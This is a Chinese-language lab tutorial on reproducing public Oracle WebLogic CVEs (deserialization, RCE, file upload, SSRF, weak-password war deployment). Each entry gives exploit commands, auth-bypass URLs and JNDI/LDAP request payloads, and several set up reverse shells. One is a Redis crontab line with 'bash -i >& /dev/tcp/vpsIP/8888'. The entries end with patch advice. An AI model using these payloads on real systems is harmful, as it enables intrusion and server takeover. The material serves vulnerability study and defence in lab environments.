# Weblogic简介

​		WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。		WebLogic是美商Oracle的主要产品之一，是并购BEA得来。是商业市场上主要的Java（J2EE）应用服务器软件（application server）之一，是世界上第一个成功商业化的J2EE应用服务器, 已推出到12c(12.2.1.4) 版。而此产品也延伸出WebLogic Portal，WebLogic Integration等企业用的中间件（但当下Oracle主要以Fusion Middleware融合中间件来取代这些WebLogic Server之外的企业包），以及OEPE(Oracle Enterprise Pack for Eclipse)开发工具。

# Weblogic漏洞环境搭建

​		为了更加高效便捷的复现weblogic相关漏洞，可直接使用docker拖取相关漏洞环境镜像进行漏洞复现。此处介绍两种常见漏洞环境搭建方法。

## dockerhub镜像拖取及环境搭建

​		dockerhub中拥有各类常用环境镜像文件，使用相关镜像文件搭建漏洞环境可以免去安装配置过程，极大节约漏洞复现时间。

![Dingtalk_20220325111040](.\image\Dingtalk_20220325111040.jpg)

首先访问dockerhub镜像站：https://registry.hub.docker.com/并搜索目标环境名。

![Dingtalk_20220325111209](.\image\Dingtalk_20220325111209.jpg)

选择其中合适的环境镜像进行镜像拖取。

![Dingtalk_20220325111417](.\image\Dingtalk_20220325111417.jpg)

![Dingtalk_20220325135747](.\image\Dingtalk_20220325135747.jpg)

启动漏洞环境并查看对应ID。

![Dingtalk_20220325140434](.\image\Dingtalk_20220325140434.jpg)

![Dingtalk_20220325140235](.\image\Dingtalk_20220325140235.jpg)

## vulhub镜像拖取及环境搭建

​		vulhub中拥有各类已公开漏洞环境镜像文件，使用相关镜像文件搭建漏洞环境可以免去安装配置过程，极大节约漏洞复现时间。

![image-20220325140919331](.\image\image-20220325140919331.png)

首先下载vulhub。

![Dingtalk_20220325141527](.\image\Dingtalk_20220325141527.jpg)

切换至目标漏洞环境目录并启动该漏洞环境。

![Dingtalk_20220325141909](.\image\Dingtalk_20220325141909.jpg)

查看漏洞环境进程及端口占用情况并使用浏览器访问。

![Dingtalk_20220325142036](.\image\Dingtalk_20220325142036.jpg)

![Dingtalk_20220325142118](.\image\Dingtalk_20220325142118.jpg)

# Weblogic漏洞复现

## Weblogic反序列化漏洞

### CVE-2015-4852

影响版本：

Oracle WebLogic Server 12.2.1.0
Oracle WebLogic Server 12.1.3.0
Oracle WebLogic Server 12.1.2.0
Oracle WebLogic Server 10.3.6.0

漏洞复现：

![Dingtalk_20220321165030](.\image\Dingtalk_20220321165030.jpg)

该漏洞可直接使用集成化工具实现一键利用。

![Dingtalk_20220321165801](.\image\Dingtalk_20220321165801.jpg)

修复建议：

1、对ApacheCommons Collections组件进行修复，目前ApacheCommons Collections已经在3.2.2版本中做了修复，对这些不安全的Java类的序列化支持增加开关，默认为关闭状态。

2、及时安装weblogic修复补丁

### CVE-2016-0638

影响版本：

Oracle WebLogic Server 12.2.1.0
Oracle WebLogic Server 12.1.3.0
Oracle WebLogic Server 12.1.2.0
Oracle WebLogic Server 10.3.6.0

漏洞复现：

CVE-2016-0638是基于 CVE-2015-4852漏洞的一个简单绕过。

![Dingtalk_20220321172018](.\image\Dingtalk_20220321172018.jpg)

该漏洞可直接使用批量检测利用工具实现一键利用。

![Dingtalk_20220321172023](.\image\Dingtalk_20220321172023.jpg)

![Dingtalk_20220321172123](.\image\Dingtalk_20220321172123.jpg)

修复建议：

升级服务器内核版本至最新。

### CVE-2017-3248

影响版本：

Oracle WebLogic Server 12.2.1.0
Oracle WebLogic Server 12.1.3.0
Oracle WebLogic Server 12.2.1.1
Oracle WebLogic Server 10.3.6.0

漏洞复现：

![Dingtalk_20220323152005](.\image\Dingtalk_20220323152005.jpg)

该漏洞可直接使用集成化工具实现一键利用。

本机执行：java -jar weblogic_cmd.jar -C "系统命令" -H 目标主机域名或IP -P 端口

![Dingtalk_20220323152011](.\image\Dingtalk_20220323152011.jpg)

修复建议：

1、及时安装weblogic修复补丁。

2、使用安全组策略屏蔽7001内网入和公网入方向流量。

### CVE-2017-3506

影响版本：

Oracle WebLogic Server 10.3.6.0

Oracle WebLogic Server 12.1.3.0

Oracle WebLogic Server 12.2.1.0

Oracle WebLogic Server 12.2.1.1

Oracle WebLogic Server 12.2.1.2

漏洞复现：
![Dingtalk_20220325143814](.\image\Dingtalk_20220325143814.jpg)

利用集成化工具进行漏洞检测。

本机执行：java -jar WebLogic-XMLDecoder.jar -u http://目标主机域名或IP:端口

![Dingtalk_20220325143919](.\image\Dingtalk_20220325143919.jpg)

利用集成化工具进行漏洞利用。

本机执行：java -jar WebLogic-XMLDecoder.jar -s http://目标主机域名或IP:端口 path.txt文件中路径 shell.jsp

![Dingtalk_20220325144036](.\image\Dingtalk_20220325144036.jpg)

![Dingtalk_20220325144332](.\image\Dingtalk_20220325144332.jpg)

### CVE-2017-10271

影响版本：

Oracle WebLogic Server 12.1.3.0
Oracle WebLogic Server 12.2.1.1
Oracle WebLogic Server 10.3.6.0



漏洞复现：

![Dingtalk_20220323153924](.\image\Dingtalk_20220323153924.jpg)

命令执行：利用burpsuite发送命令执行exp并将其中cmd参数值修改为系统命令即可实现远程命令执行。

![Dingtalk_20220323154332](.\image\Dingtalk_20220323154332.jpg)

![Dingtalk_20220323154500](.\image\Dingtalk_20220323154500.jpg)

反弹shell：vps开启nc监听。

![Dingtalk_20220324141119](.\image\Dingtalk_20220324141119.jpg)

利用burpsuite发送反弹shellexp并将其中vpsIP和vps端口修改为vpsIP和nc监听端口。

![Dingtalk_20220324141252](.\image\Dingtalk_20220324141252.jpg)

![Dingtalk_20220324141350](.\image\Dingtalk_20220324141350.jpg)

修复建议：

1、根据攻击者利用POC分析发现所利用的为wls-wsat组件的CoordinatorPortType接口，若Weblogic服务器集群中未应用此组件，建议临时备份后将此组件删除，当形成防护能力后，再进行恢复。 根据实际环境路径，删除WebLogic wls-wsat组件。

2、及时安装weblogic修复补丁。

### CVE-2018-2893

影响版本：

Oracle WebLogic Server 10.3.6.0
Oracle WebLogic Server 12.1.3.0
Oracle WebLogic Server 12.2.1.2
Oracle WebLogic Server 12.2.1.3

漏洞复现：

![Dingtalk_20220401170339](.\image\Dingtalk_20220401170339.jpg)

本机利用ysoserial-cve-2018-2893.jar生成payload。

本机执行：java -jar ysoserial-cve-2018-2893.jar JRMPClient4 "vpsIP:1099" > poc5.ser

![Dingtalk_20220401170649](.\image\Dingtalk_20220401170649.jpg)

vps利用ysoserial-0.0.6-SNAPSHOT-BETA-all.jar开启JRMP监听（此处需要将系统命令进行bash编码）。

vps执行：java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099 Jdk7u21 "bash编码后的系统命令"

![Dingtalk_20220401170835](.\image\Dingtalk_20220401170835.jpg)

vps开启nc监听。

![Dingtalk_20220401170911](.\image\Dingtalk_20220401170911.jpg)

本机利用weblogic.py脚本发起反序列化攻击。

本机执行：python2 weblogic.py 目标主机域名或IP 端口 poc5.ser

![Dingtalk_20220401171033](.\image\Dingtalk_20220401171033.jpg)

此时vpsJRMP监听端口会接收到目标主机请求，同时nc监听端口会接收到目标主机反弹的bashshell。

![Dingtalk_20220401171114](.\image\Dingtalk_20220401171114.jpg)

![Dingtalk_20220401171202](.\image\Dingtalk_20220401171202.jpg)

修复建议：

1、及时安装weblogic修复补丁。

### CVE-2018-3245

影响版本：

Oracle WebLogic Server 10.3.6.0

Oracle WebLogic Server 12.1.3.0

Oracle WebLogic Server 12.2.1.3

漏洞复现：

![Dingtalk_20220323154918](.\image\Dingtalk_20220323154918.jpg)

本机利用ysoserial-cve-2018-3245.jar生成payload。

本机执行：java -jar ysoserial-cve-2018-3245.jar CVE_2018_3245 "vpsIP:1099" > poc5.ser

![Dingtalk_20220323155701](.\image\Dingtalk_20220323155701.jpg)

vps利用ysoserial-0.0.6-SNAPSHOT-BETA-all.jar开启JRMP监听（此处需要将系统命令进行bash编码）。

vps执行：java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099 Jdk7u21 "bash编码后的系统命令"

![Dingtalk_20220323160114](.\image\Dingtalk_20220323160114.jpg)

vps开启nc监听。

![Dingtalk_20220323160255](.\image\Dingtalk_20220323160255.jpg)

本机利用weblogic.py脚本发起反序列化攻击。

本机执行：python2 weblogic.py 目标主机域名或IP 端口 poc5.ser

![Dingtalk_20220323160554](.\image\Dingtalk_20220323160554.jpg)

此时vpsJRMP监听端口会接收到目标主机请求，同时nc监听端口会接收到目标主机反弹的bashshell。

![Dingtalk_20220323160815](.\image\Dingtalk_20220323160815.jpg)

![Dingtalk_20220323160905](.\image\Dingtalk_20220323160905.jpg)

修复建议：

1、及时安装weblogic修复补丁。

### CVE-2018-3252

影响版本：

Oracle WebLogic Server 10.3.6.0

Oracle WebLogic Server 12.1.3.0

Oracle WebLogic Server 12.2.1.3

漏洞复现：

![Dingtalk_20220323154918](.\image\Dingtalk_20220323154918.jpg)

该漏洞可直接使用批量检测利用工具实现一键利用。

![Dingtalk_20220411120614](.\image\Dingtalk_20220411120614.jpg)

修复建议：

1、及时安装weblogic修复补丁。

### CVE-2019-2725

影响版本：

Oracle WebLogic Server 10.*
Oracle WebLogic Server 12.1.3

漏洞复现：

![Dingtalk_20220323162731](.\image\Dingtalk_20220323162731.jpg)

该漏洞可直接使用批量检测利用工具实现一键利用。

![Dingtalk_20220323162907](.\image\Dingtalk_20220323162907.jpg)

![Dingtalk_20220323162948](.\image\Dingtalk_20220323162948.jpg)

修复建议：

1、升级本地JDK环境。

2、及时安装weblogic修复补丁。

### CVE-2019-2729

影响版本：

Oracle WebLogic Server 12.1.3.0
Oracle WebLogic Server 12.2.1.3
Oracle WebLogic Server 10.3.6.0

漏洞复现：

![Dingtalk_20220323163351](.\image\Dingtalk_20220323163351.jpg)

利用burpsuite发送exp并将其中lfcmd参数值修改为系统命令即可实现远程命令执行。

![Dingtalk_20220323164056](.\image\Dingtalk_20220323164056.jpg)

修复建议：

1、删除 wls9_async_response.war 文件和 wls-wsat.war 文件及相关文件夹并重启Weblogic服务。

2、通过访问策略控制禁止 /_async/* 路径的URL访问。

3、升级本地JDK环境。

4、及时安装weblogic修复补丁。

### CVE-2020-2551

影响版本：

Oracle WebLogic Server 12.2.1.3
Oracle WebLogic Server 12.1.3.0
Oracle WebLogic Server 12.2.1.4
Oracle WebLogic Server 10.3.6.0

漏洞复现：

![Dingtalk_20220324093512](.\image\Dingtalk_20220324093512.jpg)

该漏洞可直接使用批量检测利用工具实现一键利用。

![Dingtalk_20220324104639](.\image\Dingtalk_20220324104639.jpg)



修复建议：

1、及时安装weblogic修复补丁。

### CVE-2020-2555

影响版本：

Oracle WebLogic Server 12.2.1.3
Oracle WebLogic Server 12.1.3.0
Oracle WebLogic Server 12.2.1.4

漏洞复现：

![Dingtalk_20220324111120](.\image\Dingtalk_20220324111120.jpg)

该漏洞可直接使用批量检测利用工具实现一键利用。

![Dingtalk_20220324111710](.\image\Dingtalk_20220324111710.jpg)

![Dingtalk_20220324111748](.\image\Dingtalk_20220324111748.jpg)

修复建议：

1、及时安装weblogic修复补丁。

### CVE-2021-2394

影响版本：

Oracle WebLogic Server 10.3.6.0

Oracle WebLogic Server 12.1.3.0

Oracle WebLogic Server 12.2.1.3

Oracle WebLogic Server 12.2.1.4

Oracle WebLogic Server 14.1.1.0

漏洞复现：

vps使用JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar开启JNDI监听。

vps执行：java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash编码后的系统命令" -A vpsIP

![Dingtalk_20220324174515](.\image\Dingtalk_20220324174515.jpg)

vps开启nc监听。

![Dingtalk_20220324174604](.\image\Dingtalk_20220324174604.jpg)

vps利用CVE_2021_2394.jar发送攻击数据包。

vps执行：java -jar CVE_2021_2394.jar 目标主机域名或IP 端口 ldap监听地址

![Dingtalk_20220324174656](.\image\Dingtalk_20220324174656.jpg)

vps成功接收bashshell。

![Dingtalk_20220324174816](.\image\Dingtalk_20220324174816.jpg)

修复建议:

1、及时安装weblogic修复补丁。

## weblogic远程命令执行漏洞

### CVE-2018-2628

影响版本：

Oracle WebLogic Server 10.3.6.0

Oracle WebLogic Server 12.1.3.0

Oracle WebLogic Server 12.2.1.2

Oracle WebLogic Server 12.2.1.3

漏洞复现：

![Dingtalk_20220325150737](.\image\Dingtalk_20220325150737.jpg)

该漏洞可使用漏洞利用脚本进行一键利用。

本机执行："Weblogic GetShell CVE-2018-2628.exe" 目标主机域名或IP 端口

![Dingtalk_20220325150710](.\image\Dingtalk_20220325150710.jpg)

修复建议:

1、及时安装weblogic修复补丁。

2、关闭T3服务，或控制T3服务的访问权限。

### CVE-2018-3191

影响版本：

Oracle WebLogic Server 10.3.6.0

Oracle WebLogic Server 12.1.3.0

Oracle WebLogic Server 12.2.1.3

漏洞复现：

![Dingtalk_20220330093826](.\image\Dingtalk_20220330093826.jpg)

vps利用ysoserial-0.0.6-SNAPSHOT-BETA-all.jar开启JRMP监听（此处需要将系统命令进行bash编码）。

vps执行：java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'bash编码后的系统命令'

![Dingtalk_20220330095412](.\image\Dingtalk_20220330095412.jpg)

vps开启nc监听。

![Dingtalk_20220330095541](.\image\Dingtalk_20220330095541.jpg)

本机使用批量检测利用工具进行漏洞检测后切换至命令执行模块并设置CMD参数值为：rmi://vpsIP:1099/

![Dingtalk_20220330095759](.\image\Dingtalk_20220330095759.jpg)

![Dingtalk_20220330095829](.\image\Dingtalk_20220330095829.jpg)

此时vpsJRMP监听端口会接收到目标主机请求，同时nc监听端口会接收到目标主机反弹的bashshell。

![Dingtalk_20220330100022](.\image\Dingtalk_20220330100022.jpg)

![Dingtalk_20220330100131](.\image\Dingtalk_20220330100131.jpg)

修复建议：

1、及时安装weblogic修复补丁。

2、禁用T3协议。

### CVE-2020-2883

影响版本：

Oracle WebLogic Server 10.3.6.0.0

Oracle WebLogic Server 12.1.3.0.0

Oracle WebLogic Server 12.2.1.3.0

Oracle WebLogic Server 12.2.1.4.0

漏洞复现：

![Dingtalk_20220330141809](.\image\Dingtalk_20220330141809.jpg)

vps开启nc监听。

![Dingtalk_20220330141917](.\image\Dingtalk_20220330141917.jpg)

本机利用自动化脚本进行一键利用。

本机执行：python2 cve-2020-2883_cmd.py -u http://目标主机域名或IP:端口 -c "bash编码后的系统命令"

![Dingtalk_20220330142418](.\image\Dingtalk_20220330142418.jpg)

此时vps8888端口可成功接收目标主机回弹bashshell。

![Dingtalk_202203330142528](.\image\Dingtalk_202203330142528.jpg)

修复建议：

1、及时安装weblogic修复补丁。

### CVE-2020-14645

影响版本：

Oracle WebLogic Server 10.3.6.0

Oracle WebLogic Server 12.2.1.4

Oracle WebLogic Server 12.2.1.3

Oracle WebLogic Server 12.1.3.0

Oracle WebLogic Server 14.1.1.0

漏洞复现：

vps利用JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar开启ldap监听。

vps执行：java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar  -C "bash编码后的系统命令" -A 95.169.0.244

![Dingtalk_20220330152558](.\image\Dingtalk_20220330152558.jpg)

vps开启nc监听。

![Dingtalk_20220330152658](.\image\Dingtalk_20220330152658.jpg)

本机利用CVE-2020-14645.jar发送攻击数据包。

本机执行：java -jar CVE-2020-14645.jar ldap监听地址 http://目标主机域名或IP:端口

![Dingtalk_20220330153245](.\image\Dingtalk_20220330153245.jpg)

此时vpsldap监听端口会接收到目标主机请求，同时nc监听端口会接收到目标主机反弹的bashshell。

![Dingtalk_20220330153427](.\image\Dingtalk_20220330153427.jpg)

![Dingtalk_20220330153519](.\image\Dingtalk_20220330153519.jpg)

修复建议：

1、及时安装weblogic修复补丁。

2、禁用T3协议。

3、禁用IIOP协议。

### CVE-2020-14882

影响版本：

Oracle WebLogic Server 10.3.6.0
Oracle WebLogic Server 12.1.3.0
Oracle WebLogic Server 12.2.1.3
Oracle WebLogic Server 12.2.1.4
Oracle WebLogic Server 14.1.1.0

漏洞复现：

![image-20220331093018986](.\image\image-20220331093018986.png)

使用如下URL绕过控制台组件身份认证，未授权访问后台管理页面。

http://目标主机域名或IP:端口/console/css/%252e%252e%252fconsole.portal

![Dingtalk_20220331093252](.\image\Dingtalk_20220331093252.jpg)

本机使用漏洞利用脚本进行命令执行。

本机执行：python3 CVE-2020-14882.py -u http://目标主机域名或IP:端口/ -c "系统命令"

![Dingtalk_20220331095508](.\image\Dingtalk_20220331095508.jpg)

修复建议：

1、及时安装weblogic修复补丁。

### CVE-2020-14883

影响版本：

Oracle WebLogic Server 10.3.6.0
Oracle WebLogic Server 12.1.3.0
Oracle WebLogic Server 12.2.1.3
Oracle WebLogic Server 12.2.1.4
Oracle WebLogic Server 14.1.1.0

漏洞复现：

![Dingtalk_20220331095610](.\image\Dingtalk_20220331095610.jpg)

修改xml文件中反弹shell地址为vps地址。

![Dingtalk_20220331100053](.\image\Dingtalk_20220331100053.jpg)

将修改后的xml文件上传至vps并利用python开启临时http服务。

vps执行：python -m SimpleHTTPServer 8000

![Dingtalk_20220331100439](.\image\Dingtalk_20220331100439.jpg)

vps开启nc监听。

![Dingtalk_20220331100601](.\image\Dingtalk_20220331100601.jpg)

本机访问如下url发送攻击数据包。

http://目标主机域名或IP:端口/console/css/%252e%252e%252fconsole.portal?nfpb=true&pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://监听IP:监听端口/test.xml")

![Dingtalk_20220331101230](.\image\Dingtalk_20220331101230.jpg)

此时vps可成功接收bashshell。

![Dingtalk_20220331101341](.\image\Dingtalk_20220331101341.jpg)

修复建议：

1、及时安装weblogic修复补丁。

### CVE-2021-2109

影响版本：

Oracle WebLogic Server 10.3.6.0

Oracle WebLogic Server 12.1.3.0

Oracle WebLogic Server 12.2.1.3

Oracle WebLogic Server 12.2.1.4

Oracle WebLogic Server 14.1.1.0

漏洞复现：

![Dingtalk_20220331101572](.\image\Dingtalk_20220331101572.jpg)

修改Exploit.java文件中反弹shell地址为vps地址。

![Dingtalk_20220331102208](.\image\Dingtalk_20220331102208.jpg)

将修改后的Exploit.java文件上传至vps并进行编译。

vps执行：javac Exploit.java -source 1.6 -target 1.6

![Dingtalk_20220331102542](.\image\Dingtalk_20220331102542.jpg)

vps利用python开启临时http服务。

vps执行：python -m SimpleHTTPServer 8888

![Dingtalk_20220331103045](.\image\Dingtalk_20220331103045.jpg)

vps利用marshalsec-0.0.3-SNAPSHOT-all.jar开启ldap监听。

vps执行：java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://监听IP:监听端口/#Exploit" 1099

![Dingtalk_20220331103344](.\image\Dingtalk_20220331103344.jpg)

vps开启nc监听。

![Dingtalk_20220331103432](.\image\Dingtalk_20220331103432.jpg)

本机访问如下URL并抓取数据包。

http://目标主机域名或IP:端口/console/css/%252e%252e%252f/consolejndi.portal

![Dingtalk_20220331105123](.\image\Dingtalk_20220331105123.jpg)

将数据包请求方式修改为POST并添加如下请求体。

_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://vpsIP:1099/Exploit;AdminServer%22)

![Dingtalk_20220331105432](.\image\Dingtalk_20220331105432.jpg)

发送上述数据包后vps即可成功接收反弹shell。

![Dingtalk_20220331105638](.\image\Dingtalk_20220331105638.jpg)

修复建议：

1、禁用T3协议。

2、禁止启用IIOP协议。

3、临时关闭后台/console/console.portal对外访问。

4、及时安装weblogic修复补丁。

## WebLogic任意文件上传漏洞

### CVE-2018-2894

影响版本：

Oracle WebLogic Server 10.3.6.0

Oracle WebLogic Server 12.1.3.0

Oracle WebLogic Server 12.2.1.2

Oracle WebLogic Server 12.2.1.3

漏洞复现：

由于Web 测试页面在“生产模式”下默认不开启，所以该漏洞存在一定限制。为了复现该漏洞，需要提前开启Web 测试页面。

登录weblogic管理后台，点击base_domain的配置，在"Advanced"中开启"启用Web服务测试页"选项，在最下方点击save保存。

![Dingtalk_20220331143932](.\image\Dingtalk_20220331143932.jpg)

![Dingtalk_20220331144031](.\image\Dingtalk_20220331144031.jpg)

环境配置完成后，浏览器访问http://目标主机域名或IP:端口/ws_utc/config.do并将当前的工作目录为更改为如下目录，提交并保存。

/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css

![Dingtalk_20220331144353](.\image\Dingtalk_20220331144353.jpg)

随后点击左侧”安全“模块，选择”添加“并上传jsp木马。

![Dingtalk_20220331144706](.\image\Dingtalk_20220331144706.jpg)

上传时抓取数据包并记录响应包中时间戳参数。

![Dingtalk_20220331145145](.\image\Dingtalk_20220331145145.jpg)

利用冰蝎3连接webshell，webshell地址如下。

http://目标主机域名或IP:端口/ws_utc/css/config/keystore/时间戳_文件名

![Dingtalk_20220331145501](.\image\Dingtalk_20220331145501.jpg)

修复建议：

1、设置config.do页面登录授权后才能访问。

2、及时安装weblogic修复补丁。

### CVE-2019-2618

影响版本：

Oracle WebLogic Server 10.3.6.0

Oracle WebLogic Server 12.1.3.0

Oracle WebLogic Server 12.2.1.3

漏洞复现：

CVE-2019-2618是任意文件上传漏洞，但上传利用接口需要账号密码，由于weblogic本身是可以上传war包进行网站部署的，所以该漏洞比较鸡肋。

![Dingtalk_20220331174558](.\image\Dingtalk_20220331174558.jpg)

使用自动化脚本进行漏洞利用。

![Dingtalk_20220331174752](.\image\Dingtalk_20220331174752.jpg)

![Dingtalk_20220331174907](.\image\Dingtalk_20220331174907.jpg)

1、及时安装weblogic修复补丁。

## WebLogic SSRF漏洞

### CVE-2014-4210

影响版本：

Oracle WebLogic Server 10.3.6.0
Oracle WebLogic Server 10.0.2.0

漏洞复现：

![Dingtalk_20220401104105](.\image\Dingtalk_20220401104105.jpg)

浏览器访问http://目标主机域名或IP:端口/uddiexplorer/，若能查看uddiexplorer应用则存在SSRF漏洞。

![Dingtalk_20220401104408](.\image\Dingtalk_20220401104408.jpg)

随后浏览器访问http://目标主机域名或IP:端口/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://内网IP:端口/

并抓取数据包，通过替换operator参数值即可实现内网端口探测。

首先访问本机7001端口，页面回显404，说明该端口处于开放状态。

![Dingtalk_20220401104706](.\image\Dingtalk_20220401104706.jpg)

尝试访问未开放端口发现页面回显无法连接。

![Dingtalk_20220401104947](.\image\Dingtalk_20220401104947.jpg)

随后访问如下页面即可查看服务器内网IP（此处由于是在本机搭建的漏洞环境，因此显示的是localhost。实战中会泄露真实内网IP）。

![Dingtalk_20220401105134](.\image\Dingtalk_20220401105134.jpg)

通过得到的服务器内网IP进行同网段端口探测，发现内网主机172.24.0.2开放6379端口。

![Dingtalk_20220401105613](.\image\Dingtalk_20220401105613.jpg)

随后将如下命令进行url编码。

set 1 "\n\n\n\n* * * * * root bash -i >& /dev/tcp/vpsIP/8888 0>&1\n\n\n\n"
config set dir /etc/
config set dbfilename crontab
save

![Dingtalk_20220401111558](.\image\Dingtalk_20220401111558.jpg)

浏览器访问如下url发送攻击payload。

http://目标主机域名或IP:端口//uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://内网IP:端口/test%0D%0A%0D%0A编码后的字符串

![Dingtalk_20220401111508](.\image\Dingtalk_20220401111508.jpg)

随后vps开启nc监听。

![Dingtalk_20220401110726](.\image\Dingtalk_20220401110726.jpg)

稍等片刻即可发现vps成功接收到目标主机反弹shell。

![Dingtalk_20220401111744](.\image\Dingtalk_20220401111744.jpg)

修复建议：

1、及时安装weblogic修复补丁。

## Weblogic弱口令部署war包

影响版本：

全部版本

漏洞复现：

![Dingtalk_20220401153142](.\image\Dingtalk_20220401153142.jpg)

Weblogic常见账号密码。

| 用户名     | 密码       |
| ---------- | ---------- |
| system     | password   |
| weblogic   | weblogic   |
| admin      | security   |
| joe        | password   |
| mary       | password   |
| system     | security   |
| wlcsystem  | wlcsystem  |
| wlpisystem | wlpisystem |

该环境账号密码为：weblogic/Oracle@123

使用弱口令登录weblogic后台管理页面。

![Dingtalk_20220401154104](.\image\Dingtalk_20220401154104.jpg)

在左侧列表中找到“部署”并点击安装上传文件。

![Dingtalk_20220401154518](.\image\Dingtalk_20220401154518.jpg)

![Dingtalk_20220401154620](.\image\Dingtalk_20220401154620.jpg)

选择木马war包并上传。

木马war包制作：准备一个 jsp木马文件，将其压缩为 shell.zip，然后重命名为 shell.war

![Dingtalk_20220401160622](.\image\Dingtalk_20220401160622.jpg)

一直点击下一步直至完成部署。

![Dingtalk_20220401160707](.\image\Dingtalk_20220401160707.jpg)

![Dingtalk_20220401160823](.\image\Dingtalk_20220401160823.jpg)

利用连接工具连接部署的webshell。

链接地址：http://目标主机域名或IP:端口/shell/shell.jsp

![Dingtalk_20220401161158](.\image\Dingtalk_20220401161158.jpg)

修复建议：

1、禁止weblogic控制台公网暴漏。

2、修改weblogic口令为强口令。
